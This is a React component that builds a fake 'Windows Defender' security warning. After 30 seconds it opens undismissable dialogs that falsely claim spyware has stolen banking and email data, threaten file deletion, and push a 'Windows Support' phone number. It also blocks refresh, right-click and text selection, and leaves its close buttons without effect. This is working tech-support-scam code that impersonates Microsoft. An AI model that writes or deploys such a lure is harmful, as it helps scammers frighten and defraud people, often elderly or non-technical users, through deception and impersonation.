import { useEffect, useState } from "react";
import { AlertDialog, AlertDialogContent } from "@/components/ui/alert-dialog";
import { Shield, ShieldAlert, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Sheet, SheetContent } from "@/components/ui/sheet";
import { Dialog, DialogContent } from "@/components/ui/dialog";

const BlockingPopup = () => {
  const [open, setOpen] = useState(false);
  const [showDetails, setShowDetails] = useState(false);
  
  useEffect(() => {
    // Show popup after 30 seconds
    const timer = setTimeout(() => {
      setOpen(true);
      // Automatically show details popup when main popup appears
      setShowDetails(true);
    }, 30000);

    // Prevent refresh and other browser actions
    const preventDefaultAction = (e: KeyboardEvent) => {
      // Prevent F5 and Ctrl+R/Cmd+R
      if (
        e.key === "F5" || 
        ((e.ctrlKey || e.metaKey) && e.key === "r") ||
        e.keyCode === 116
      ) {
        e.preventDefault();
        return false;
      }
    };

    const preventContextMenu = (e: MouseEvent) => {
      e.preventDefault();
    };

    const preventSelection = (e: Event) => {
      e.preventDefault();
    };

    // Block actions when popup is open
    if (open) {
      // Prevent keyboard shortcuts for refresh
      window.addEventListener("keydown", preventDefaultAction, { capture: true });
      // Prevent right-click
      window.addEventListener("contextmenu", preventContextMenu);
      // Prevent selection
      document.addEventListener("selectstart", preventSelection);
    }

    return () => {
      clearTimeout(timer);
      window.removeEventListener("keydown", preventDefaultAction);
      window.removeEventListener("contextmenu", preventContextMenu);
      document.removeEventListener("selectstart", preventSelection);
    };
  }, [open]);
  
  return (
    <>
      {/* Main security warning dialog */}
      <AlertDialog open={open} onOpenChange={() => {}}>
        <AlertDialogContent 
          className="p-0 border-0 max-w-xl"
        >
          {/* Blue header */}
          <div className="bg-[#0078D4] text-white p-4">
            <h2 className="text-xl font-bold mb-1">Windows Defender - Security Warning</h2>
            <p className="text-sm font-bold">** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
          </div>
          
          <div className="p-5 pb-2">
            <div className="flex items-center gap-3 mb-4">
              <img 
                src="/lovable-uploads/40d57122-9014-430f-a2f5-7aeb904ad3fa.png" 
                alt="Microsoft Logo" 
                className="w-10 h-10" 
              />
              <span className="font-bold text-lg">Microsoft</span>
            </div>
            
            <p className="mb-4">
              Your computer has alerted us that it has been infected with a DOSAttack Spyware. The following data has been compromised:
            </p>
            
            <ul className="list-disc pl-8 mb-4 text-gray-800">
              <li>Email Credentials</li>
              <li>Banking Information</li>
              <li>Personal Photos</li>
            </ul>
            
            <div className="flex justify-end mt-6 mb-4">
              <Button 
                variant="outline"
                className="mr-2"
                onClick={() => setShowDetails(true)}
              >
                More Details
              </Button>
              <Button 
                className="bg-[#0078D4] hover:bg-[#006cc1] text-white"
                onClick={() => {/* Cannot close dialog */}}
              >
                Activate License
              </Button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>

      {/* Details dialog */}
      <Dialog 
        open={showDetails && open} 
        onOpenChange={() => {}} // Prevent closing by setting empty handler
      >
        <DialogContent className="sm:max-w-md p-0 gap-0 overflow-hidden" closeButton={false}>
          <div className="flex items-center justify-between p-4 border-b">
            <div className="flex items-center space-x-2">
              <Shield className="h-6 w-6 text-[#0078D4]" />
              <h2 className="text-lg font-semibold text-[#0078D4]">Windows Defender Security Center</h2>
            </div>
            <button 
              className="text-gray-500 hover:text-gray-700"
              onClick={() => {/* Disable close button by removing actual functionality */}}
            >
              <X className="h-5 w-5" />
            </button>
          </div>

          <div className="p-6">
            <div className="text-center mb-5">
              <p className="font-semibold text-red-600">App: Ads.fancetracks(2).dll</p>
              <p className="font-semibold text-red-600">Threat Detected: DOSAttack Spyware</p>
            </div>

            <div className="flex justify-center mb-6">
              <div className="grid grid-cols-3 gap-4 max-w-sm">
                <div className="flex flex-col items-center">
                  <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNzhENDt9PC9zdHlsZT48cGF0aCBjbGFzcz0ic3QwIiBkPSJNMjQsNGMtMTEsMC0yMCwxLjgtMjAsMS44djE5djVjMCwxLjcsMC45LDMuMiwyLjQsNGwxNSw4LjFjMS43LDAuOSwzLjYsMC45LDUuMywwYzAsMCwwLDAsMCwwbDEyLjgtNy4yYzEuNS0wLjksMi40LTIuNCwyLjQtNC4ydi01VjUuOEMyNCw0LDI0LDQsMjQsNHogTTI0LDYuMmM5LDAsMTUuOCwxLjgsMTUuOCwxLjh2MTcuOGMwLDAtNS43LDEuNi0xNS44LDEuNlM4LjIsMjUuOCw4LjIsMjUuOFY4QzguMiw4LDE1LDYuMiwyNCw2LjJ6IE0zNi45LDEzLjhjLTAuNCwwLjEtMC43LDAuNS0wLjYsMC45YzAsMC4xLDAsMC4xLDAsMC4yYzAsMC40LDAuMywwLjcsMC43LDAuN2MwLDAsMCwwLDAsMGgwLjFjMC40LTAuMSwwLjctMC41LDAuNy0wLjljMC0wLjQtMC40LTAuNy0wLjgtMC43QzM3LDEzLjgsMzYuOSwxMy44LDM2LjksMTMuOHogTTM0LjcsMTQuN2MtMC4xLDAtMC4zLDAtMC40LDAuMUwzMywxNS41bC0wLjEsMC4xYy0wLjMsMC4zLTAuMywwLjcsMCwxYzAuMywwLjMsMC43LDAuMywxLDBsMC4xLTAuMWwxLjItMC44YzAuNC0wLjIsMC41LTAuNywwLjMtMUMzNS4zLDE0LjgsMzUsMTQuNywzNC43LDE0Ljd6IE0xOC4yLDE4LjFjLTAuNCwwLTAuNywwLjItMC44LDAuNWMtMC4xLDAuNC0wLjUsMC44LDAuMywxbDEuOC0wLjljMC40LTAuMiwwLjUtMC42LDAuMy0xQzMwLjQsMTYuNiwyOS45LDE2LjQsMjkuNSwxNi43TDI5LjUsMTYuN3ogTTIzLjcsMThoLTEuOGMtMC40LDAtMC44LDAuMy0wLjgsMC44YzAsMC40LDAuMywwLjcsMC44LDAuOGgxLjhjMC40LDAsMC44LTAuMywwLjgtMC44QzI0LjUsMTguMywyNC4yLDE4LDIzLjcsMTh6IE0xMywxOS43Yy0wLjIsMC0wLjUsMC4xLTAuNiwwLjNsLTEuMywxLjdsMCwwYy0wLjMsMC4zLTAuMiwwLjgsMC4xLDEuMWMwLjMsMC4zLDAuOCwwLjIsMS4xLTAuMWwwLDBsMS4zLTEuN2MwLjMtMC4zLDAuMi0wLjgsMC0xLjFDMTMuNCwxOS44LDEzLjIsMTkuNywxMywxOS43TDEzLDE5Ljd6IE05LjcsMjIuOGMtMC4xLTAuNC0wLjUtMC42LTAuOS0wLjVjLTAuMSwwLTAuMiwwLjEtMC4zLDAuMWMtMC40LDAuMi0wLjUsMC43LTAuMywxLjFjMC4yLDAuNCwwLjcsMC41LDEuMSwwLjNjMC40LTAuMiwwLjUtMC42LDAuMy0xQzkuNywyMi45LDkuNywyMi44LDkuNywyMi44eiBNMzcuNywxNi43Yy0wLjEsMC0wLjIsMC0wLjIsMEgzNWMtMC40LDAtMC43LDAuMy0wLjcsMC43YzAsMC40LDAuMywwLjcsMC43LDAuN2gyLjVjMC40LDAsMC43LTAuMywwLjctMC43QzM4LjUsMTcsMzguMSwxNi43LDM3LjcsMTYuN3ogTTM3LjgsMjBjLTAuMSwwLTAuMywwLTAuNCwwLjFsLTEuOSwxLjljLTAuMywwLjMtMC4zLDAuNywwLDFjMC4zLDAuMywwLjcsMC4zLDEsMGwxLjktMS45YzAuMywwLDAuNi0wLjQsMC4zLTAuN0MzNC43LDI0LDM0LjQsMjMuOSwzNC4xLDIzLjl6IE0xNS41LDI3LjJsMS41LTYuMWMwLjMtMS4zLDAuOC0xLjcsMC44LTEuN2MxLjQsMCwyLjEsMC43LDIuMSwwLjdjMCwwLjEsMC4xLDAuNiwwLDEuNmwtMS41LDUuOWMtMC4xLDAuNSwwLjIsMS4xLDAuNywxLjNjMC41LDAuMiwxLjEsMCwxLjMtMC41bDAuMS0wLjNsMS42LTYuNGMwLjMtMS4yLDAuMi0wLjUsMC43LTAuMywxLjFjMC4yLDAuNCwwLjcsMC41LDEuMSwwLjNjMC40LTAuMiwwLjUtMC42LDAuMy0xQzkuNywyMi45LDkuNywyMi44LDkuNywyMi44eiBNMzIuNSwyNy42Yy0wLjcsMi0yLjMsMy41LTQuNyw0LjRjLTAuNSwwLjItMC44LTAuMS0wLjYtMC42YzEuNC0zLjQsNC0zLjMsNC4zLTUuOGMwLjMtMi4zLDEuMi0xLjksMi4xLTAuN0MzNC4yLDI1LjksMzIuOSwyNi41LDMyLjUsMjcuNnogTTIzLjUsMzIuNGMzLjQsMCw3LjQtMS40LDcuNC0zLjRjMC0xLjItMi41LTEuNy0zLjItMS43Yy0yLjMsMCw3LDMuMS03LDMuMUMyMC43LDMxLjUsMjEuNywzMi40LDIzLjUsMzIuNHogTTIzLjYsMjcuMmw0LjYtMy40bC00LjYtMi42bC00LjYsMi42TDIzLjYsMjcuMnoiLz48L3N2Zz4=" 
                    alt="Scan Icon" className="w-12 h-12" />
                  <span className="text-xs mt-1">Scan</span>
                </div>
                <div className="flex flex-col items-center">
                  <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB2aWV3Qm94PSIwIDAgNDggNDgiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDQ4IDQ4OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4uc3Qwe2ZpbGw6IzAwNzhENDt9PC9zdHlsZT48cGF0aCBjbGFzcz0ic3QwIiBkPSJNMjQsNGMtMTEsMC0yMCwxLjgtMjAsMS44djE5djVjMCwxLjcsMC45LDMuMiwyLjQsNGwxNSw4LjFjMS43LDAuOSwzLjYsMC45LDUuMywwYzAsMCwwLDAsMCwwbDEyLjgtNy4yYzEuNS0wLjksMi40LTIuNCwyLjQtNC4ydi01VjUuOEMyNCw0LDI0LDQsMjQsNHogTTI0LDYuMmM5LDAsMTUuOCwxLjgsMTUuOCwxLjh2MTcuOGMwLDAtNS43LDEuNi0xNS44LDEuNlM4LjIsMjUuOCw4LjIsMjUuOFY4QzguMiw4LDE1LDYuMiwyNCw2LjJ6IE0zNi45LDEzLjhjLTAuNCwwLjEtMC43LDAuNS0wLjYsMC45YzAsMC4xLDAsMC4xLDAsMC4yYzAsMC40LDAuMywwLjcsMC43LDAuN2MwLDAsMCwwLDAsMGgwLjFjMC40LTAuMSwwLjctMC41LDAuNy0wLjljMC0wLjQtMC40LTAuNy0wLjgtMC43QzM3LDEzLjgsMzYuOSwxMy44LDM2LjksMTMuOHogTTM0LjcsMTQuN2MtMC4xLDAtMC4zLDAtMC40LDAuMUwzMywxNS41bC0wLjEsMC4xYy0wLjMsMC4zLTAuMywwLjcsMCwxYzAuMywwLjMsMC43LDAuMywxLDBsMC4xLTAuMWwxLjItMC44YzAuNC0wLjIsMC41LTAuNywwLjMtMUMzNS4zLDE0LjgsMzUsMTQuNywzNC43LDE0Ljd6IE0xOC4yLDE4LjFjLTAuNCwwLTAuNywwLjItMC44LDAuNWMtMC4xLDAuNC0wLjUsMC44LDAuMywxbDEuOC0wLjljMC40LTAuMiwwLjUtMC42LDAuMy0xQzMwLjQsMTYuNiwyOS45LDE2LjQsMjkuNSwxNi43TDI5LjUsMTYuN3ogTTIzLjcsMThoLTEuOGMtMC40LDAtMC44LDAuMy0wLjgsMC44YzAsMC40LDAuMywwLjcsMC44LDAuOGgxLjhjMC40LDAsMC44LTAuMywwLjgtMC44QzI0LjUsMTguMywyNC4yLDE4LDIzLjcsMTh6IE0xMywxOS43Yy0wLjIsMC0wLjUsMC4xLTAuNiwwLjNsLTEuMywxLjdsMCwwYy0wLjMsMC4zLTAuMiwwLjgsMC4xLDEuMWMwLjMsMC4zLDAuOCwwLjIsMS4xLTAuMWwwLDBsMS4zLTEuN2MwLjMtMC4zLDAuMi0wLjgsMC0xLjFDMTMuNCwxOS44LDEzLjIsMTkuNywxMywxOS43TDEzLDE5Ljd6IE05LjcsMjIuOGMtMC4xLTAuNC0wLjUtMC42LTAuOS0wLjVjLTAuMSwwLTAuMiwwLjEtMC4zLDAuMWMtMC40LDAuMi0wLjUsMC43LTAuMywxLjFjMC4yLDAuNCwwLjcsMC41LDEuMSwwLjNjMC40LTAuMiwwLjUtMC42LDAuMy0xQzkuNywyMi45LDkuNywyMi44LDkuNywyMi44eiBNMzcuNywxNi43Yy0wLjEsMC0wLjIsMC0wLjIsMEgzNWMtMC40LDAtMC43LDAuMy0wLjcsMC43YzAsMC40LDAuMywwLjcsMC43LDAuN2gyLjVjMC40LDAsMC43LTAuMywwLjctMC43QzM4LjUsMTcsMzguMSwxNi43LDM3LjcsMTYuN3ogTTM3LjgsMjBjLTAuMSwwLTAuMywwLTAuNCwwLjFsLTEuOSwxLjljLTAuMywwLjMtMC4zLDAuNywwLDFjMC4zLDAuMywwLjcsMC4zLDEsMGwxLjktMS45YzAuMywwLDAuNi0wLjQsMC4zLTAuN0MzNC43LDI0LDM0LjQsMjMuOSwzNC4xLDIzLjl6IE0xNS41LDI3LjJsMS41LTYuMWMwLjMtMS4zLDAuOC0xLjcsMC44LTEuN2MxLjQsMCwyLjEsMC43LDIuMSwwLjdjMCwwLjEsMC4xLDAuNiwwLDEuNmwtMS41LDUuOWMtMC4xLDAuNSwwLjIsMS4xLDAuNywxLjNjMC41LDAuMiwxLjEsMCwxLjMtMC41bDAuMS0wLjNsMS42LTYuNGMwLjMtMS4yLDAuMi0wLjUsMC43LTAuMywxLjFjMC4yLDAuNCwwLjcsMC41LDEuMSwwLjNjMC40LTAuMiwwLjUtMC42LDAuMy0xQzkuNywyMi45LDkuNywyMi44LDkuNywyMi44eiBNMzIuNSwyNy42Yy0wLjcsMi0yLjMsMy41LTQuNyw0LjRjLTAuNSwwLjItMC44LTAuMS0wLjYtMC42YzEuNC0zLjQsNC0zLjMsNC4zLTUuOGMwLjMtMi4zLDEuMi0xLjksMi4xLTAuN0MzNC4yLDI1LjksMzIuOSwyNi41LDMyLjUsMjcuNnogTTIzLjUsMzIuNGMzLjQsMCw3LjQtMS40LDcuNC0zLjRjMC0xLjItMi41LTEuNy0zLjItMS43Yy0yLjMsMCw3LDMuMS03LDMuMUMyMC43LDMxLjUsMjEuNywzMi40LDIzLjUsMzIuNHogTTIzLjYsMjcuMmw0LjYtMy40bC00LjYtMi42bC00LjYsMi42TDIzLjYsMjcuMnoiLz48L3N2Zz4=" 
                    alt="Security Icon" className="w-12 h-12" />
                  <span className="text-xs mt-1">Security</span>
                </div>
                <div className="flex flex-col items-center">
                  <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNzhkNCIgZD0iTTI0IDRDMTIuOTU0IDQgNCA1Ljc4MSA0IDUuNzgxdjE5LjAgNS4wYzAgMS42NTcgMC45MDggMy4xODcgMi40MjIgNGwxNS4wIDguMTI1YzEuNjU0IDAuODk1IDMuNjQ4IDAuODc2IDUuMjg3IC0wLjAyNzQ0YzAuMDA5MDMgLTAuMDA1MDcgMC4wMTc5NyAtMC4wMTAzIDAuMDI3MzQgLTAuMDE1NjJsMTIuODQgLTcuMjI0NmMxLjUyNCAtMC44NTYxIDIuNDI0IC0yLjQ0NiAyLjQyNCAtNC4xNzE5di01LjAgLTE4Ljg5NGMtMCAwaC0xOC4weiBtMCAyLjIxODhjOC45OSAwIDE1Ljc4MSAxLjc4MTMgMTUuNzgxIDEuNzgxM3YxNy44NDRjLTAgMCAtNS42NzQgMS42MDYxIC0xNS43ODEgMS42MDYxcy0xNS43ODEgLTEuNjA2IC0xNS43ODEgLTEuNjA2di0xNy44NDRzNi43MzcgLTEuNzgxMyAxNS43ODEgLTEuNzgxM3pNMTIgMTN2Nmg2di0yaC00djJoNnYtNnpNMTIgMjl2NGg0djJoLTZ2LTZ6TTMwIDI5djZoLTZ2LTJoNHYtNHoiLz48L3N2Zz4=" 
                    alt="Settings Icon" className="w-12 h-12" />
                  <span className="text-xs mt-1">Settings</span>
                </div>
              </div>
            </div>

            <div className="text-center mb-6">
              <h3 className="text-lg font-bold text-[#0078D4] mb-2">
                Access to this PC has been blocked for security reasons.
              </h3>
              <p className="text-[#0078D4] font-semibold">
                Contact Windows Support: +1-202-843-5111 (Toll Free)
              </p>
            </div>

            <p className="text-sm text-gray-600 mb-6">
              Note: If you think this notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this computer ID is flagged and is connected over the Internet Servers, files and apps deletion may start any moment.
            </p>

            <div className="flex justify-center gap-4">
              <Button 
                variant="outline" 
                className="w-24 border-gray-300" 
                onClick={() => {/* Cannot close dialog */}}
              >
                Deny
              </Button>
              <Button 
                className="w-24 bg-[#0078D4] hover:bg-[#006cc1]"
                onClick={() => {/* Cannot close dialog */}}
              >
                Allow
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
};

export default BlockingPopup;
